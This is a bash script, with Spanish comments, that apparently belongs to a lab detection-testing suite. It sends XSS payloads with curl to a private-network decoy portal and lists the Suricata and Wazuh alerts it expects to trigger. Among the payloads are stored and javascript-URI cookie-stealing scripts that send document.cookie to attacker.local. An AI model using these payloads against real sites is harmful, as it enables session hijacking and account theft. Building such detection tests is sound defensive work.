#!/bin/bash
# ============================================================================
# Escenario S06: XSS (T1059.007)
# ============================================================================
# Herramientas: curl + payloads manuales
# Target: Decoy Portal endpoint /vuln/xss/ y /declaraciones/nueva/
# ============================================================================

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
mkdir -p "$EVIDENCE_DIR"

DECOY_PORTAL="http://172.20.0.21:8000"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")

echo "=========================================="
echo "S06: XSS (T1059.007)"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="

echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"

# 1. XSS Reflected
echo "[*] Fase 1: XSS Reflected"
PAYLOAD1='<script>alert("XSS-Test-1")</script>'
curl -s "$DECOY_PORTAL/vuln/xss/?name=$(echo $PAYLOAD1 | jq -sRr @uri)" \
    -o "$EVIDENCE_DIR/xss_reflected_1.html"

# 2. XSS con event handler
echo "[*] Fase 2: XSS event handler"
PAYLOAD2='<img src=x onerror=alert("XSS-IMG")>'
curl -s "$DECOY_PORTAL/vuln/xss/?name=$(echo $PAYLOAD2 | jq -sRr @uri)" \
    -o "$EVIDENCE_DIR/xss_reflected_2.html"

# 3. XSS Stored via POST
echo "[*] Fase 3: XSS Stored (POST)"
CSRF_TOKEN=$(curl -s -c "$EVIDENCE_DIR/cookies.txt" "$DECOY_PORTAL/declaraciones/nueva/" | grep csrfmiddlewaretoken | head -1 | awk -F'"' '{print $4}')

curl -s -b "$EVIDENCE_DIR/cookies.txt" \
    -X POST "$DECOY_PORTAL/declaraciones/nueva/" \
    -d "csrfmiddlewaretoken=$CSRF_TOKEN" \
    -d "nit=1234567" \
    -d "periodo=2024-12" \
    --data-urlencode "descripcion=<script>document.location='http://attacker.local/steal?c='+document.cookie</script>" \
    -o "$EVIDENCE_DIR/xss_stored.html"

# 4. XSS via XSS-Me
PAYLOAD3='javascript:fetch("http://attacker.local/log?c="+document.cookie)'
curl -s "$DECOY_PORTAL/vuln/xss/?name=$(echo $PAYLOAD3 | jq -sRr @uri)" \
    -o "$EVIDENCE_DIR/xss_javascript_uri.html"

END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
echo "$END_TIME" > "$EVIDENCE_DIR/end_time.txt"

cat > "$EVIDENCE_DIR/resultados.json" <<EOF
{
  "scenario": "S06-xss",
  "technique_id": "T1059.007",
  "technique_name": "JavaScript Execution",
  "tactic": "Execution",
  "timestamp_start": "$TIMESTAMP",
  "timestamp_end": "$END_TIME",
  "tools_used": ["curl"],
  "payloads_tested": [
    "<script>alert</script>",
    "<img onerror>",
    "javascript: URI",
    "Stored XSS via form"
  ],
  "evidence_files": [
    "xss_reflected_1.html",
    "xss_reflected_2.html",
    "xss_stored.html",
    "xss_javascript_uri.html"
  ],
  "expected_detection": [
    "Suricata rule 2024020 (script tag)",
    "Suricata rule 2024022 (onerror)",
    "Wazuh rule 100201 (XSS)",
    "Decoy Portal middleware detection"
  ],
  "iso27035_phase": "Detection and Reporting (Phase 2)"
}
EOF

echo "[OK] Escenario S06 ejecutado."
